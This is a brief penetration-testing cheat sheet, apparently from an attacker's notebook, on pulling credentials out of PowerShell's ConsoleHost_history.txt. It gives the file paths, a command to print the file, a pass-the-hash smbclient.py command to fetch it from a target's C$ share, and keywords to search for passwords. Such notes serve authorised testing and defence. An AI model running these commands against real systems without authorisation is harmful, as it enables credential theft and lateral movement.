# PowerShell History Credential Leak

PowerShell saves command history to `ConsoleHost_history.txt` per user. Credentials passed as CLI arguments (e.g. `-Password`, `-Credential`, `net use /password:`) appear verbatim.

```powershell
# default path
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# if encoding issues in winrm/shell (e.g. Unicode): grab via smbclient.py and read locally
```
```bash
smbclient.py '<domain>/Administrator@<TARGET>' -hashes :<HASH>
# inside: use C$, cd to the path, get ConsoleHost_history.txt
```

Also check: `$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Look for patterns: `password`, `-cred`, `SecureString`, `ConvertTo-SecureString`, `-p `, `net use`.
